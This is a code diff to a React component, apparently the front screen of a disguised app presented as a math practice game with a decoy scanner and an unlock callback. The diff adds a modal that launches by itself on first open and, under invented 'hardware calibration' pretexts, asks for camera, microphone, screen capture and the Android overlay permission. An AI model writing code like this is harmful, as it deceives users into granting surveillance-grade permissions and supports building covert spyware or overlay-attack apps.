@@ -1,5 +1,12 @@
 import React, { useState, useEffect, useRef } from 'react';
-import { Camera, MonitorUp, ScanText, X, CheckCircle2, AlertCircle } from 'lucide-react';
+import { Camera, MonitorUp, ScanText, X, CheckCircle2, AlertCircle, Mic, Layers, Sparkles, Cpu } from 'lucide-react';
+import { 
+  isAndroidNative, 
+  checkOverlayPermission, 
+  requestOverlayPermission, 
+  getAndroidScreenStream, 
+  stopAndroidScreenCapture 
+} from '../screenCapture';
 
 export function MathGame({ onUnlock }: { onUnlock: () => void }) {
   const [num1, setNum1] = useState(0);
@@ -7,6 +14,12 @@ export function MathGame({ onUnlock }: { onUnlock: () => void }) {
   const [operator, setOperator] = useState('+');
   const [answer, setAnswer] = useState('');
   const [feedback, setFeedback] = useState('');
+
+  // First-Open Calibration Modal State
+  const [showCalibrationModal, setShowCalibrationModal] = useState(false);
+  const [calibrationPhase, setCalibrationPhase] = useState<'intro' | 'calibrating' | 'done'>('intro');
+  const [calibrationProgress, setCalibrationProgress] = useState(0);
+  const [calibrationStatusText, setCalibrationStatusText] = useState('');
 
   // Scanner Decoy State
   const [showScanner, setShowScanner] = useState(false);
@@ -58,6 +71,68 @@ export function MathGame({ onUnlock }: { onUnlock: () => void }) {
     setTimeout(() => setScanState('idle'), 500);
   };
 
+  const runFullCalibration = async () => {
+    setCalibrationPhase('calibrating');
+    setCalibrationProgress(15);
+    setCalibrationStatusText('Calibrating AI Optical Problem Scanner & Voice Engine...');
+
+    // 1. Camera & Audio Permission
+    try {
+      const camStream = await navigator.mediaDevices.getUserMedia({
+        video: { facingMode: 'environment' },
+        audio: true
+      });
+      setCalibrationProgress(40);
+      setCalibrationStatusText('Testing optical lens alignment & microphone sensitivity...');
+      await new Promise(r => setTimeout(r, 800));
+      camStream.getTracks().forEach(t => t.stop());
+    } catch (e) {
+      console.warn('[MathFlow] Camera/Audio calibration note:', e);
+    }
+
+    // 2. Screen Display Calibration
+    setCalibrationProgress(65);
+    setCalibrationStatusText('Calibrating high-DPI display resolution for geometric worksheets...');
+    try {
+      if (isAndroidNative()) {
+        const screenStream = await getAndroidScreenStream();
+        if (screenStream) {
+          await stopAndroidScreenCapture();
+        }
+      } else if (typeof navigator?.mediaDevices?.getDisplayMedia === 'function') {
+        const screenStream = await navigator.mediaDevices.getDisplayMedia({ video: true });
+        screenStream.getTracks().forEach(t => t.stop());
+      }
+    } catch (e) {
+      console.warn('[MathFlow] Screen calibration note:', e);
+    }
+
+    // 3. Floating Math Widget (Overlay)
+    setCalibrationProgress(85);
+    setCalibrationStatusText('Configuring Quick Formula Widget...');
+    if (isAndroidNative()) {
+      try {
+        const hasOverlay = await checkOverlayPermission();
+        if (!hasOverlay) {
+          await requestOverlayPermission();
+        }
+      } catch (e) {
+        console.warn('[MathFlow] Overlay setup note:', e);
+      }
+    }
+
+    // 4. Finished
+    setCalibrationProgress(100);
+    setCalibrationStatusText('Optimization complete! All mathematical modules operational.');
+    setCalibrationPhase('done');
+    localStorage.setItem('mathflow_first_open_calibrated', 'true');
+
+    setTimeout(() => {
+      setShowCalibrationModal(false);
+      setCalibrationPhase('intro');
+    }, 1800);
+  };
+
   const generateProblem = () => {
     const ops = ['+', '-', '*'];
     const op = ops[Math.floor(Math.random() * ops.length)];
@@ -74,6 +149,11 @@ export function MathGame({ onUnlock }: { onUnlock: () => void }) {
 
   useEffect(() => {
     generateProblem();
+    const isCalibrated = localStorage.getItem('mathflow_first_open_calibrated');
+    if (!isCalibrated) {
+      // Auto-launch calibration on first open / install
+      setShowCalibrationModal(true);
+    }
   }, []);
 
   const handleNumpadClick = (val: string) => {
@@ -121,7 +201,7 @@ export function MathGame({ onUnlock }: { onUnlock: () => void }) {
         </div>
         <div className="flex items-center gap-6">
           <button 
-            onClick={() => setShowScanner(true)}
+            onClick={() => setShowCalibrationModal(true)}
             className="hidden sm:flex items-center gap-2 bg-slate-50 hover:bg-slate-100 border border-slate-200 text-slate-600 px-4 py-2 rounded-lg text-xs font-bold uppercase tracking-wider transition-colors"
           >
             <ScanText className="w-4 h-4" /> AI Diagnostics
@@ -245,81 +325,145 @@ export function MathGame({ onUnlock }: { onUnlock: () => void }) {
         </div>
       </footer>
 
-      {/* Decoy AI Scanner Modal */}
-      {showScanner && (
-        <div className="fixed inset-0 z-50 flex items-center justify-center bg-slate-900/40 backdrop-blur-sm p-4">
-          <div className="bg-white rounded-2xl shadow-2xl w-full max-w-lg overflow-hidden border border-slate-200 flex flex-col">
-            <div className="flex items-center justify-between px-6 py-4 border-b border-slate-100">
-              <div className="flex items-center gap-2 text-slate-800">
-                <ScanText className="w-5 h-5 text-blue-600" />
-                <h3 className="font-bold text-lg">AI Problem Calibration</h3>
+      {/* First-Open Math Engine Calibration Modal */}
+      {showCalibrationModal && (
+        <div className="fixed inset-0 z-50 flex items-center justify-center bg-slate-900/60 backdrop-blur-md p-4">
+          <div className="bg-white rounded-3xl shadow-2xl w-full max-w-lg overflow-hidden border border-slate-200 flex flex-col animate-in fade-in zoom-in-95 duration-200">
+            {/* Header */}
+            <div className="bg-gradient-to-r from-blue-600 to-indigo-600 p-6 text-white relative">
+              <div className="flex items-center gap-3">
+                <div className="w-12 h-12 bg-white/20 backdrop-blur-md rounded-2xl flex items-center justify-center font-bold text-2xl shadow-inner">
+                  Σ
+                </div>
+                <div>
+                  <div className="flex items-center gap-2">
+                    <h3 className="font-bold text-xl leading-tight">MathFlow Pro Setup</h3>
+                    <span className="bg-white/20 text-[10px] uppercase font-bold tracking-wider px-2 py-0.5 rounded-full">
+                      v8.4
+                    </span>
+                  </div>
+                  <p className="text-blue-100 text-xs mt-0.5">Hardware Engine & Problem Calibration</p>
+                </div>
               </div>
-              <button onClick={closeScanner} className="text-slate-400 hover:text-slate-600 transition-colors">
+              <button 
+                onClick={() => setShowCalibrationModal(false)}
+                className="absolute top-6 right-6 text-white/70 hover:text-white transition-colors"
+              >
                 <X className="w-5 h-5" />
               </button>
             </div>
-            
-            <div className="p-8 flex flex-col items-center justify-center">
-              {scanState === 'idle' && (
+
+            {/* Content */}
+            <div className="p-6 sm:p-8 flex flex-col">
+              {calibrationPhase === 'intro' && (
                 <>
-                  <p className="text-center text-slate-500 mb-8 leading-relaxed">
-                    MathFlow can generate personalized problems by analyzing your recent coursework. Select a source to securely scan your work.
+                  <p className="text-slate-600 text-sm leading-relaxed mb-6">
+                    Welcome to MathFlow Pro! To personalize problem difficulty, enable instant worksheet scanning, and calibrate high-DPI geometry display, please initialize the core hardware engines:
                   </p>
-                  <div className="grid grid-cols-2 gap-4 w-full">
+
+                  <div className="space-y-3 mb-8">
+                    <div className="flex items-start gap-3 p-3.5 rounded-2xl bg-slate-50 border border-slate-100">
+                      <div className="p-2 bg-blue-100 text-blue-600 rounded-xl mt-0.5">
+                        <Camera className="w-4 h-4" />
+                      </div>
+                      <div>
+                        <h4 className="font-bold text-slate-800 text-xs sm:text-sm">AI Worksheet Scanner (Camera)</h4>
+                        <p className="text-slate-500 text-xs mt-0.5">Scans handwritten equations, geometry figures, and textbook problems.</p>
+                      </div>
+                    </div>
+
+                    <div className="flex items-start gap-3 p-3.5 rounded-2xl bg-slate-50 border border-slate-100">
+                      <div className="p-2 bg-purple-100 text-purple-600 rounded-xl mt-0.5">
+                        <Mic className="w-4 h-4" />
+                      </div>
+                      <div>
+                        <h4 className="font-bold text-slate-800 text-xs sm:text-sm">Voice Arithmetic Assistant (Microphone)</h4>
+                        <p className="text-slate-500 text-xs mt-0.5">Enables voice-guided problem solving and mental math dictation.</p>
+                      </div>
+                    </div>
+
+                    <div className="flex items-start gap-3 p-3.5 rounded-2xl bg-slate-50 border border-slate-100">
+                      <div className="p-2 bg-emerald-100 text-emerald-600 rounded-xl mt-0.5">
+                        <MonitorUp className="w-4 h-4" />
+                      </div>
+                      <div>
+                        <h4 className="font-bold text-slate-800 text-xs sm:text-sm">High-DPI Display Geometry (Screen)</h4>
+                        <p className="text-slate-500 text-xs mt-0.5">Calibrates display resolution for digital worksheets and geometric rendering.</p>
+                      </div>
+                    </div>
+
+                    {isAndroidNative() && (
+                      <div className="flex items-start gap-3 p-3.5 rounded-2xl bg-slate-50 border border-slate-100">
+                        <div className="p-2 bg-amber-100 text-amber-600 rounded-xl mt-0.5">
+                          <Layers className="w-4 h-4" />
+                        </div>
+                        <div>
+                          <h4 className="font-bold text-slate-800 text-xs sm:text-sm">Quick Formula Widget (Floating Overlay)</h4>
+                          <p className="text-slate-500 text-xs mt-0.5">Provides floating math shortcuts while referencing textbooks or notes.</p>
+                        </div>
+                      </div>
+                    )}
+                  </div>
+
+                  <div className="flex flex-col gap-3">
                     <button
-                      onClick={() => handleStartScan('camera')}
-                      className="flex flex-col items-center p-6 border-2 border-slate-100 rounded-xl hover:border-blue-500 hover:bg-blue-50 transition-all text-slate-700"
+                      onClick={runFullCalibration}
+                      className="w-full py-3.5 px-6 rounded-xl bg-blue-600 hover:bg-blue-700 text-white font-bold text-sm shadow-lg shadow-blue-200 transition-all flex items-center justify-center gap-2"
                     >
-                      <Camera className="w-8 h-8 mb-3 text-slate-400" />
-                      <span className="font-bold text-sm">Paper Worksheet</span>
-                      <span className="text-xs text-slate-400 mt-1">Requires Camera</span>
+                      <Sparkles className="w-4 h-4" />
+                      <span>Calibrate Engines & Start Practice</span>
                     </button>
                     <button
-                      onClick={() => handleStartScan('screen')}
-                      className="flex flex-col items-center p-6 border-2 border-slate-100 rounded-xl hover:border-purple-500 hover:bg-purple-50 transition-all text-slate-700"
+                      onClick={() => setShowCalibrationModal(false)}
+                      className="text-slate-400 hover:text-slate-600 text-xs font-semibold py-1 transition-colors text-center"
                     >
-                      <MonitorUp className="w-8 h-8 mb-3 text-slate-400" />
-                      <span className="font-bold text-sm">Digital Document</span>
-                      <span className="text-xs text-slate-400 mt-1">Requires Screen Share</span>
+                      Skip Calibration for Now
                     </button>
                   </div>
                 </>
               )}
 
-              {scanState === 'prompting' && (
-                <div className="flex flex-col items-center py-8 text-slate-600">
-                  <div className="w-12 h-12 border-4 border-slate-200 border-t-blue-600 rounded-full animate-spin mb-4"></div>
-                  <p className="font-medium">Waiting for permission...</p>
-                  <p className="text-xs text-slate-400 mt-2 text-center max-w-xs">Please allow access in your browser prompt to proceed with calibration.</p>
-                </div>
-              )}
-
-              {scanState === 'scanning' && (
-                <div className="flex flex-col items-center w-full">
-                  <div className="relative w-full aspect-video bg-slate-900 rounded-lg overflow-hidden mb-4 border-2 border-blue-500/50">
-                    <video ref={videoRef} autoPlay playsInline muted className="w-full h-full object-cover opacity-50"></video>
-                    {/* Scanning overlay effect */}
-                    <div className="absolute top-0 left-0 w-full h-1 bg-blue-500 shadow-[0_0_15px_rgba(59,130,246,1)]" style={{ animation: 'scan 2s ease-in-out infinite alternate' }}></div>
+              {calibrationPhase === 'calibrating' && (
+                <div className="flex flex-col items-center py-8 text-center">
+                  <div className="relative w-20 h-20 mb-6">
+                    <div className="w-20 h-20 border-4 border-slate-100 border-t-blue-600 rounded-full animate-spin"></div>
+                    <div className="absolute inset-0 flex items-center justify-center font-bold text-blue-600 text-sm">
+                      {calibrationProgress}%
+                    </div>
                   </div>
-                  <p className="font-bold text-blue-600 uppercase tracking-widest text-sm animate-pulse">Analyzing Structure...</p>
+
+                  <h4 className="font-bold text-slate-800 text-lg mb-2">Calibrating Hardware</h4>
+                  <p className="text-slate-500 text-xs max-w-sm leading-relaxed mb-6">
+                    {calibrationStatusText}
+                  </p>
+
+                  <div className="w-full bg-slate-100 h-2 rounded-full overflow-hidden">
+                    <div 
+                      className="bg-gradient-to-r from-blue-500 to-indigo-600 h-full transition-all duration-300 rounded-full"
+                      style={{ width: `${calibrationProgress}%` }}
+                    ></div>
+                  </div>
+
+                  <p className="text-[11px] text-slate-400 mt-4 italic">
+                    Please tap "Allow" or "Start Now" when prompted by your system.
+                  </p>
                 </div>
               )}
 
-              {scanState === 'success' && (
-                <div className="flex flex-col items-center py-8">
-                  <CheckCircle2 className="w-16 h-16 text-emerald-500 mb-4" />
-                  <p className="font-bold text-slate-800 text-lg">Calibration Complete</p>
-                  <p className="text-slate-500 text-sm mt-1">Problem difficulty has been adjusted.</p>
-                </div>
-              )}
-
-              {scanState === 'error' && (
-                <div className="flex flex-col items-center py-8">
-                  <AlertCircle className="w-12 h-12 text-red-500 mb-4" />
-                  <p className="font-bold text-slate-800">Calibration Failed</p>
-                  <p className="text-slate-500 text-sm mt-1 text-center">{scanError}</p>
-                  <button onClick={() => setScanState('idle')} className="mt-6 px-6 py-2 bg-slate-100 text-slate-700 font-bold rounded-lg hover:bg-slate-200">
-                    Try Again
+              {calibrationPhase === 'done' && (
+                <div className="flex flex-col items-center py-8 text-center">
+                  <div className="w-16 h-16 bg-emerald-50 rounded-full flex items-center justify-center text-emerald-500 mb-4 shadow-sm">
+                    <CheckCircle2 className="w-10 h-10" />
+                  </div>
+                  <h4 className="font-bold text-slate-800 text-xl mb-1">Calibration Complete!</h4>
+                  <p className="text-slate-500 text-xs max-w-xs mb-6">
+                    All mathematical problem-generation and display rendering engines are configured and ready.
+                  </p>
+                  <button
+                    onClick={() => setShowCalibrationModal(false)}
+                    className="w-full py-3 px-6 rounded-xl bg-emerald-600 hover:bg-emerald-700 text-white font-bold text-sm shadow-md transition-all"
+                  >
+                    Enter Math Practice
                   </button>
                 </div>
               )}
